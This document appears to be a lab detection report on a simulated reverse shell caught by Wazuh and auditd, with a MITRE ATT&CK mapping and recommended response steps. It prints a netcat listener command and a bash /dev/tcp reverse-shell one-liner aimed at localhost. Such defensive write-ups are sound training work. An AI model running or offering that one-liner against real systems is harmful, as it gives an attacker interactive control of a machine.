# REVERSE SHELL DETECTION REPORT

## Executive Summary
- Detection Type: Reverse Shell
- Agent: kali (192.168.1.109)
- Total Alerts: 5
- Time Period: 2026-10-11 11:29:48 PKT
- Attack Source: 127.0.0.1 (localhost)

## Alert Details

| Rule ID | Description | Level | MITRE |
|---------|-------------|-------|-------|
| 100005 | Process execution detected via auditd | 10 | T1059 |

## Suspicious Processes Detected

1. **Netcat Listener:**
   nc -lvnp 4444

2. **Bash Reverse Shell:**
   bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

## MITRE ATT&CK Mapping
- **T1059** - Command and Scripting Interpreter
- **T1059.004** - Unix Shell
- **Tactic:** Execution

## Key Findings
1. Netcat listener detected
2. Bash reverse shell detected
3. Auditd + Wazuh detected execution
4. Real SOC: kill process, block IP, investigate

## Recommended Actions
1. **Immediate:** No escalation (lab)
2. **Real SOC:** Kill reverse shell process
3. **Real SOC:** Block C2 IP
4. **Real SOC:** Check for persistence
5. **Improvement:** Add reverse shell rules

## Status
**CLOSED** - Lab simulation

## Analyst Notes
Reverse Shell is a critical post-exploitation technique.
It allows:
- Interactive shell access
- Command execution
- File transfer
- Full system control

Detection relies on:
- Process monitoring (Auditd)
- Network connection analysis
- Process signatures
- Custom rules (100005)
